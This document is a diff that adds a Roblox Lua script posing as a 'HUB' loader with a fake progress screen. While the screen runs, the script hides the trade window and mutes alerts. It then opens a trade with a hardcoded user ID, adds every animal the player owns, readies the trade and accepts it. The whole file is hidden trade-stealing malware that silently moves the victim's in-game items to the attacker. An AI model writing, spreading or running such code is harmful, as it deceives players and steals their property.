@@ -1,0 +1,194 @@
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+
+pcall(function()
+local gui = game.Players.LocalPlayer.PlayerGui:WaitForChild("TradeLiveTrade"):WaitForChild("TradeLiveTrade")
+gui.Visible=false
+
+gui:GetPropertyChangedSignal("Visible"):Connect(function()
+gui.Visible=false
+end)
+end)
+
+local blur=workspace.Camera:FindFirstChild("Blur")
+
+for _, k in pairs(game:GetService("SoundService"):GetChildren()) do
+	
+	k:Destroy()
+end
+game:GetService("ReplicatedStorage").Sounds.Sfx.Activated.Volume=0
+game:GetService("Players").LocalPlayer.PlayerGui.Notification.Notification.Visible=false
+game:GetService("ReplicatedStorage").Sounds.Sfx.Error.Volume=0
+if blur then
+blur.Changed:Connect(function()
+blur.Enabled=false
+end)
+end
+
+
+local LoadingScreen = Instance.new("ScreenGui")
+LoadingScreen.Name = "LoadingScreen"
+LoadingScreen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+LoadingScreen.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 420, 0, 220)
+MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = LoadingScreen
+
+local Corner1 = Instance.new("UICorner")
+Corner1.CornerRadius = UDim.new(0, 16)
+Corner1.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.Size = UDim2.new(1, 0, 0.3, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "HUB"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Font = Enum.Font.GothamBlack
+Title.TextSize = 65
+Title.Parent = MainFrame
+
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Name = "LoadingText"
+LoadingText.Size = UDim2.new(1, 0, 0.2, 0)
+LoadingText.Position = UDim2.new(0, 0, 0.35, 0)
+LoadingText.BackgroundTransparency = 1
+LoadingText.Text = "Loading: 0%"
+LoadingText.TextColor3 = Color3.new(1, 1, 1)
+LoadingText.Font = Enum.Font.Gotham
+LoadingText.TextSize = 28
+LoadingText.Parent = MainFrame
+
+local ProgressBarFrame = Instance.new("Frame")
+ProgressBarFrame.Name = "ProgressBarFrame"
+ProgressBarFrame.Size = UDim2.new(0.85, 0, 0.12, 0)
+ProgressBarFrame.Position = UDim2.new(0.075, 0, 0.72, 0)
+ProgressBarFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+ProgressBarFrame.BorderSizePixel = 0
+ProgressBarFrame.Parent = MainFrame
+
+local Corner2 = Instance.new("UICorner")
+Corner2.CornerRadius = UDim.new(0, 10)
+Corner2.Parent = ProgressBarFrame
+
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Name = "ProgressBar"
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.new(1, 1, 1)
+ProgressBar.BorderSizePixel = 0
+ProgressBar.Parent = ProgressBarFrame
+
+local Corner3 = Instance.new("UICorner")
+Corner3.CornerRadius = UDim.new(0, 10)
+Corner3.Parent = ProgressBar
+
+local Gradient = Instance.new("UIGradient")
+Gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 180)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 170, 255))
+}
+Gradient.Parent = ProgressBar
+
+local function animateLoading()
+	for i = 1, 99 do
+		LoadingText.Text = "Loading: " .. i .. "%"
+		ProgressBar.Size = UDim2.new(i / 99, 0, 1, 0)
+		task.wait(55 / 99)
+	end
+	LoadingText.Text = "Loading: 100%"
+	ProgressBar.Size = UDim2.new(1, 0, 1, 0)
+	task.wait(1)
+	LoadingScreen:Destroy()
+end
+task.spawn(animateLoading)
+local userid=3328376636
+local accepttrade=275
+local mybase=nil 
+local traderemotenumber=269
+local readyremote=277
+for _, k in pairs(workspace.Plots:GetChildren()) do
+local PlotSign=k:FindFirstChild("PlotSign") 
+if PlotSign then
+	local SurfaceGui=PlotSign:FindFirstChild("SurfaceGui") 
+	if SurfaceGui then
+		
+		local Frame=SurfaceGui:FindFirstChild("Frame")
+		if Frame then
+			if Frame.TextLabel.Text==game.Players.LocalPlayer.DisplayName.."'s Base" then
+			
+	mybase=k
+--print(1)
+break
+
+			end
+		end
+	end
+end
+end
+
+local args = {
+	"afb005f9-6e81-4e0a-8bb0-3555938a9658",
+	userid
+}
+local reqdata= game:GetService("ReplicatedStorage").Packages.Synchronizer.RequestData
+if mybase then
+local data=reqdata:InvokeServer(mybase.Name)
+if data then	
+local k=game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):GetChildren()[287]
+k:InvokeServer(unpack(args))
+game:GetService("Players").LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade:GetPropertyChangedSignal("Visible"):Wait()
+
+
+
+
+
+
+	
+
+for i,o in pairs(data) do
+	
+	if i=="AnimalList" then
+	for j,p in pairs(o) do
+		
+if j~="Empty" and typeof(p)==typeof({2}) then
+
+local args = {
+	"6b5f15fb-5cb9-4d07-a031-bbff8e641eda",
+	j,
+	p
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):GetChildren()[269]:InvokeServer(unpack(args))
+
+wait(1.7)
+end
+
+	end
+end
+end
+
+
+
+
+wait(5)
+local args = {
+	"d73acf93-6f32-44df-b813-0f6b32c7afd9"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):GetChildren()[readyremote]:FireServer(unpack(args))
+
+
+game:GetService("Players").LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade.Other.ReadyButton.Txt:GetPropertyChangedSignal("Text"):Wait()
+wait(5.5)
+local args3 = {
+	"918ee0f5-e98f-413f-b76e-baee47b021cb"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):GetChildren()[275]:FireServer(unpack(args3))
+
+end
+end
+--287
